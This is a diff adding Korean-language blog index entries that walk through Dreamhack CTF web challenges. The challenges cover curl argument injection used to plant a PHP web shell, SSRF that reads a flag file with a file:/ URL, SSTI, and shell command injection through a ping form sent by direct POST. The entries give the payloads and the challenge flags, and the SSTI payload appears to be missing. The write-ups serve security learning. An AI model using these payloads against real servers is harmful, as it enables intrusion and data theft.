@@ -1,6 +1,74 @@
 [
   
   {
+    "title": "[Dreamhack] Command Injection Advanced 해설",
+    "url": "/posts/Dreamhack_Command-Injection-Advanced/",
+    "categories": "Dreamhack",
+    "tags": "dreamhack, WebHacking",
+    "date": "2026-06-09 12:00:09 +0900",
+    
+
+
+
+
+
+    
+    "snippet": "문제 특징  웹쉘을 넣는 기법을 활용한 해킹난이도: Lv.2카테고리: 웹해킹문제 구조문제파일구성/├── deploy│   ├── flag.c│   ├── run-lamp.sh│   └── src└── Dockerfile주요 코드#index.php&lt;html&gt;    &lt;head&gt;&lt;/head&gt;    &lt;link rel=\"s...",
+    "content": "문제 특징  웹쉘을 넣는 기법을 활용한 해킹난이도: Lv.2카테고리: 웹해킹문제 구조문제파일구성/├── deploy│   ├── flag.c│   ├── run-lamp.sh│   └── src└── Dockerfile주요 코드#index.php&lt;html&gt;    &lt;head&gt;&lt;/head&gt;    &lt;link rel=\"stylesheet\" href=\"/static/bulma.min.css\" /&gt;    &lt;body&gt;        &lt;div class=\"container card\"&gt;        &lt;div class=\"card-content\"&gt;        &lt;h1 class=\"title\"&gt;Online Curl Request&lt;/h1&gt;    &lt;?php        if(isset($_GET['url'])){            $url = $_GET['url'];            if(strpos($url, 'http') !== 0 ){                die('http only !');            }else{                $result = shell_exec('curl '. escapeshellcmd($_GET['url']));                $cache_file = './cache/'.md5($url);                file_put_contents($cache_file, $result);                echo \"&lt;p&gt;cache file: &lt;a href='{$cache_file}'&gt;{$cache_file}&lt;/a&gt;&lt;/p&gt;\";                echo '&lt;pre&gt;'. htmlentities($result) .'&lt;/pre&gt;';                return;            }        }else{        ?&gt;            &lt;form&gt;                &lt;div class=\"field\"&gt;                    &lt;label class=\"label\"&gt;URL&lt;/label&gt;                    &lt;input class=\"input\" type=\"text\" placeholder=\"url\" name=\"url\" required&gt;                &lt;/div&gt;                &lt;div class=\"control\"&gt;                    &lt;input class=\"button is-success\" type=\"submit\" value=\"submit\"&gt;                &lt;/div&gt;            &lt;/form&gt;        &lt;?php        }    ?&gt;        &lt;/div&gt;        &lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;이 웹 서버는 사용자가 입력한 URL을 받아 서버에서 curl로 요청하는 기능을 제공한다.URL이 반드시 http로 시작해야 함 (strpos($url, ‘http’) !== 0)escapeshellcmd()로 셸 메타문자가 이스케이프됨풀이취약점 — escapeshellcmd와 Argument Injectionescapeshellcmd()는 ; | &amp; \\ $ 같은 셸 메타문자는 막지만, 공백(space)은 막지 않는다.따라서 새로운 명령을 실행할 수는 없어도, 실행 중인 curl 명령에 옵션(인자)을 추가로 주입할 수 있다. 이를 Argument Injection이라 한다.페이로드웹쉘 준비&lt;?php system('/flag'); ?&gt;Argument Injection으로 웹쉘 업로드http://타겟주소/?url=&lt;gist_raw_url&gt;%20-o%20./cache/s.php웹쉘 실행http://타겟주소/cache/s.php정답DH{8ca5256a49452e4db9de7691a9c69b7678271383}"
+  },
+  
+  {
+    "title": "[Dreamhack] Dream Gallery 해설",
+    "url": "/posts/Dreamhack_Dream-Gallery/",
+    "categories": "Dreamhack",
+    "tags": "dreamhack, WebHacking",
+    "date": "2026-06-09 12:00:08 +0900",
+    
+
+
+
+
+
+    
+    "snippet": "문제 특징  악성 파일을 업로드하는 해킹 기법난이도: Lv.2카테고리: 웹해킹문제 구조문제파일구성/├── app.py└── Dockerfile주요 코드#app.pymini_database = []@app.route('/')def index():    return redirect(url_for('view'))@app.route('/request')def...",
+    "content": "문제 특징  악성 파일을 업로드하는 해킹 기법난이도: Lv.2카테고리: 웹해킹문제 구조문제파일구성/├── app.py└── Dockerfile주요 코드#app.pymini_database = []@app.route('/')def index():    return redirect(url_for('view'))@app.route('/request')def url_request():    url = request.args.get('url', '').lower()    title = request.args.get('title', '')    if url == '' or url.startswith(\"file://\") or \"flag\" in url or title == '':        return render_template('request.html')    try:        data = urlopen(url).read()        mini_database.append({title: base64.b64encode(data).decode('utf-8')})        return redirect(url_for('view'))    except:        return render_template(\"request.html\")이 문제는 서버측에 파일 업로드를 요청해주면 업로드를 해주는 구조다.풀이SSRF란?SSRF (Server-Side Request Forgery, 서버 사이드 요청 위조) 는 서버가 공격자 대신 요청을 보내게 만드는 취약점입니다.데이터 불러오기이 웹 서버는 사용자가 입력한 URL을 받아 서버가 직접 그 주소로 요청을 보내 데이터를 가져오는 기능이 있다.file:이라는 스키마를 사용하면 서버의 파일을 불러올 수 있다. 하지만 이 문제에는 여러가지 필터가 있으므로, 이를 우회해야 한다.페이로드      flag 파일 읽어서 갤러리에 저장curl “http://타겟주소/request?url=file:/fl%2561g.txt&amp;title=pwn”        저장된 base64 값 확인 (읽은 데이터는 base64로 인코딩되어 /view에 저장됨)curl “http://타겟주소/view”        base64 디코딩echo “찾은base64값” | base64 -d  정답DH{b2037a026b40cc98804e91b5a2a07f54}"
+  },
+  
+  {
+    "title": "[Dreamhack] simple-ssti 해설",
+    "url": "/posts/Dreamhack_simple-ssti/",
+    "categories": "Dreamhack",
+    "tags": "dreamhack, WebHacking",
+    "date": "2026-06-09 12:00:07 +0900",
+    
+
+
+
+
+
+    
+    "snippet": "문제 특징  SSTI 기법을 활용한 해킹난이도: Lv.1카테고리: 웹해킹문제 구조문제파일구성/└── app2.py주요 코드#app2.py@app.route('/')def index():    return render_template('index.html')@app.errorhandler(404)def Error404(e):    template = '...",
+    "content": "문제 특징  SSTI 기법을 활용한 해킹난이도: Lv.1카테고리: 웹해킹문제 구조문제파일구성/└── app2.py주요 코드#app2.py@app.route('/')def index():    return render_template('index.html')@app.errorhandler(404)def Error404(e):    template = '''    &lt;div class=\"center\"&gt;        &lt;h1&gt;Page Not Found.&lt;/h1&gt;        &lt;h3&gt;%s&lt;/h3&gt;    &lt;/div&gt;''' % (request.path)    return render_template_string(template), 404이 문제는 Flask 웹 어플리케이션 서버의 특성/취약점을 활용한 문제이다.풀이SSTI란?SSTI (Server-Side Template Injection, 서버 사이드 템플릿 인젝션) 는 사용자 입력이 서버의 템플릿 엔진에서 코드로 실행되어 버리는 취약점입니다.경로에 Jinja2 명령어 넣기이 웹 서버는 Flask라는 라이브러리를 통해 만들어졌고, 이 라이브러리는 Jinja2라는 템플릿 엔진을 쓴다.Jinja2의 특성은 ``안의 값을 계산하여 가져온다는 점이다. 따라서 존재하지 않는 주소에 접속했을때, 404오류와 함께 해당 경로를 띄워주는 이 사이트에서 경로를 /로 설정하고 이 속에 페이로드를 작성하는 것이다.페이로드http://타겟주소/정답DH{6c74aac721d128c637eab3f11906a44b}"
+  },
+  
+  {
+    "title": "[Dreamhack] command-injection-1 해설",
+    "url": "/posts/Dreamhack_command-injection-1/",
+    "categories": "Dreamhack",
+    "tags": "dreamhack, WebHacking",
+    "date": "2026-06-09 12:00:06 +0900",
+    
+
+
+
+
+
+    
+    "snippet": "문제 특징  Command Injection 기법을 활용한 해킹난이도: Lv.1카테고리: 웹해킹문제 구조문제파일구성/├── deploy│   ├── app.py│   ├── flag.py│   ├── requirements.txt│   ├── static│   └── templates└── Dockerfile주요 코드#app.py@APP.route('...",
+    "content": "문제 특징  Command Injection 기법을 활용한 해킹난이도: Lv.1카테고리: 웹해킹문제 구조문제파일구성/├── deploy│   ├── app.py│   ├── flag.py│   ├── requirements.txt│   ├── static│   └── templates└── Dockerfile주요 코드#app.py@APP.route('/ping', methods=['GET', 'POST'])def ping():    if request.method == 'POST':        host = request.form.get('host')        cmd = f'ping -c 3 \"{host}\"'        try:            output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5)            return render_template('ping_result.html', data=output.decode('utf-8'))        except subprocess.TimeoutExpired:            return render_template('ping_result.html', data='Timeout !')        except subprocess.CalledProcessError:            return render_template('ping_result.html', data=f'an error occurred while executing the command. -&gt; {cmd}')    return render_template('ping.html')이 문제는 요청에 커맨드 명령어를 함께 넣어 해킹을 하는 문제다.풀이CMDI (Command Injection) 이란?웹 앱이 사용자 입력을 OS 명령어 문자열에 그대로 끼워넣어 실행할 때, 공격자가 명령어를 조작해 임의의 시스템 명령을 실행시키는 취약점입니다.입력란에 쉘 명령어 넣기이 문제 역시 사용자 입력을 OS명령어로 바로 실행시키는 상황이므로, 이를 이용하여 우리가 직접 쉘 명령어를 이용할 수 있을 것이다.ping -c 3 “8.8.8.8\"; cat flag.py; #”=&gt; ping -c 3 “8.8.8.8”; cat flag.py; #” (#을 통해 뒷부분 주석)페이로드8.8.8.8\"; cat flag.py; #문제 발생#ping.html&lt;h1&gt;Let's ping your host&lt;/h1&gt;&lt;br/&gt;&lt;form method=\"POST\"&gt;  &lt;div class=\"row\"&gt;    &lt;div class=\"col-md-6 form-group\"&gt;      &lt;label for=\"Host\"&gt;Host&lt;/label&gt;      &lt;input type=\"text\" class=\"form-control\" id=\"Host\" placeholder=\"8.8.8.8\" name=\"host\" pattern=\"[A-Za-z0-9.]{5,20}\" required&gt;    &lt;/div&gt;  &lt;/div&gt;  &lt;button type=\"submit\" class=\"btn btn-default\"&gt;Ping!&lt;/button&gt;&lt;/form&gt;html단위에서 형식검사를 하므로, input에 쉘 스크립트를 작동시킬 수는 없다. 하지만 이는 html, 브라우저에서 작동하는 형식검사이므로, 직접 post요청을 보내면 이러한 형식검사를 우회할 수 있다.수정된 페이로드curl -X POST 드림핵주소:포트/ping --data-urlencode 'host=\"; cat flag.py #'정답DH{pingpingppppppppping!!}"
+  },
+  
+  {
     "title": "[Dreamhack] XSS Filtering Bypass Advanced 해설",
     "url": "/posts/Dreamhack_XSS-Filtering-Bypass-Advanced/",
     "categories": "Dreamhack",
